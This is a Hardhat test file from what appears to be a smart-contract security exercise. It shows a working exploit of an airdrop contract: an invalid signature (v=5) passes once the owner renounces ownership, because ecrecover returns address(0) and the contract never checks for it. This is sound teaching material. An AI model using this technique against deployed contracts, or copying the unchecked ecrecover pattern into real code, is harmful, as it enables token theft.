const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Week22Exercise1", function () {
  async function deployToken() {
    const [deployer] = await ethers.getSigners();

    const Week22Exercise3 = await ethers.getContractFactory("Week22Exercise3");
    const week22Exercise3 = await Week22Exercise3.deploy();
    await week22Exercise3.deployed();

    return { deployer, week22Exercise3 };
  }

  describe("Exploit", function () {
    it("Exploit worked", async function () {
      const { week22Exercise3, deployer } = await loadFixture(deployToken);

      const amount = 1;
      const to = deployer.address;
      const v = 5;
      const r =
        "0xaef4899e556330b0c4e764d90b7a4c864ef03ba9725aa694ac67783bcf004aa0";
      const s =
        "0x0a01b87088c349649c938589f7b9f633f28ada510ee3e57d2d559fb8fc9da10e";

      await expect(
        week22Exercise3.claimAirdrop(amount, to, v, r, s)
      ).to.be.revertedWith("invalid signature");

      await week22Exercise3.connect(deployer).renounceOwnership();

      await week22Exercise3.claimAirdrop(amount, to, v, r, s);

      // The exploit lies in the fact that ecrecover can return address(0)
      // for an invalid signature. There is no check done for this.
      // So if the owner ever renounces ownership, owner() will return address(0),
      // an invalid signature will also return address(0) and the checks inside
      // claimAirdrop will pass.
    });
  });
});
